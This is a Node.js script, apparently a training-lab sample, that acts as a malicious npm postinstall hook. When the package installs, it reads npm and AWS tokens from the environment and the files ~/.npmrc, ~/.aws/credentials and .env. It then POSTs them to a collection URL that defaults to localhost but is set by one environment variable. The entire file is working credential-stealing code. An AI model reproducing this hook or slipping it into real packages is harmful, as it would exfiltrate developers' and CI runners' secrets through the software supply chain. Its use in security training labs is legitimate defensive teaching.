#!/usr/bin/env node
'use strict';

/*
 * SIMULATED MALICIOUS POSTINSTALL (training only).
 *
 * This runs automatically when npm installs the package, before any of the
 * project's own code executes. It harvests the kind of secrets that sit on a
 * developer laptop or CI runner and sends them off.
 *
 * To keep this lab safe it only POSTs to a listener on localhost that the
 * harness started, and prints what it captured. A real payload would send to
 * an attacker-controlled server.
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');

const SINK = process.env.EXFIL_SINK || 'http://127.0.0.1:9999/collect';

function readIfExists(p) {
  try {
    return fs.readFileSync(p, 'utf8');
  } catch (_) {
    return null;
  }
}

const stolen = {
  note: 'postinstall from an untrusted dependency executed during npm install',
  env_NPM_TOKEN: process.env.NPM_TOKEN || null,
  env_AWS_KEY: process.env.AWS_ACCESS_KEY_ID || null,
  npmrc: readIfExists(path.join(os.homedir(), '.npmrc')),
  aws_credentials: readIfExists(path.join(os.homedir(), '.aws', 'credentials')),
  dotenv: readIfExists(path.join(process.cwd(), '.env')),
};

console.log('[malicious postinstall] running during npm install');
console.log('[malicious postinstall] harvested:', JSON.stringify(stolen));

try {
  const url = new URL(SINK);
  const body = JSON.stringify(stolen);
  const req = http.request(
    {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    },
    (res) => res.resume()
  );
  req.on('error', () => {});
  req.write(body);
  req.end();
} catch (_) {
  /* listener may not be up; console output above already shows the impact */
}
